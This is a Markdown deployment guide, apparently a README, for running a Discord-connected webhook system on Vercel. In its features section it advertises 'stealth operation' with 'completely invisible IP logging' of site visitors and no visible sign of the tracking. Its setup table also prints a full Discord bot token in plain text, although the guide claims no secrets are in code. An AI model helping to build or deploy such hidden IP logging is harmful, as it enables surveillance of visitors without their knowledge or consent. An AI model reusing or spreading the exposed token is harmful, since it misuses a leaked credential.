# 🚀 Vercel Deployment Guide

## Environment Variables Setup

### 1. Go to Vercel Dashboard
1. Navigate to your project in the Vercel dashboard
2. Click on "Settings" tab
3. Click on "Environment Variables" in the left sidebar

### 2. Add Environment Variables
Add these environment variables in Vercel:

| Name | Value | Environment |
|------|-------|-------------|
| `DISCORD_BOT_TOKEN` | `MTM5MzYzMzc0Mzc5NjY5OTEzNg.GNXETy.tKy8xRHWGYqAkYnuniw2FxXPjegZdh3plC4Z_U` | Production |
| `DISCORD_CHANNEL_ID` | `1393371863542923368` | Production |
| `WEBSITE_NAME` | `slice.lol` | Production |

### 3. Deploy
1. Push your code to GitHub
2. Vercel will automatically deploy
3. The system will use Vercel's environment variables

## 🔧 Configuration Details

### Environment Variables
- **DISCORD_BOT_TOKEN**: Your Discord bot token
- **DISCORD_CHANNEL_ID**: Your Discord channel ID
- **WEBSITE_NAME**: Your website name (optional, auto-detected)

### Vercel Configuration
- **Runtime**: Node.js
- **Entry Point**: `server.js`
- **Build Command**: `npm run build`
- **Output Directory**: `dist`

## 🎯 Features in Production

### Automatic Detection
- Website URL is automatically detected from request headers
- No hardcoded website names
- Dynamic webhook naming

### Stealth Operation
- Completely invisible IP logging
- No UI elements showing webhook functionality
- Silent background operation

### Anti-Spam Protection
- 10 messages/second threshold
- Automatic webhook regeneration
- Discord bot integration

## 📊 Monitoring

### Health Check
Visit: `https://your-domain.vercel.app/api/webhook/health`

### Webhook Status
Visit: `https://your-domain.vercel.app/api/webhook/status`

## 🔒 Security

- Environment variables are encrypted in Vercel
- No secrets in code
- Automatic HTTPS
- Global CDN

## 🚨 Troubleshooting

### Bot Not Connecting
- Check environment variables in Vercel dashboard
- Verify bot token is correct
- Check Discord API status

### Webhooks Not Working
- Validate webhook URLs
- Check Discord channel permissions
- Monitor spam detection settings

### Deployment Issues
- Check Vercel build logs
- Verify `vercel.json` configuration
- Ensure all dependencies are in `package.json`

---

**Your stealth webhook system is now ready for production deployment on Vercel! 🎯** 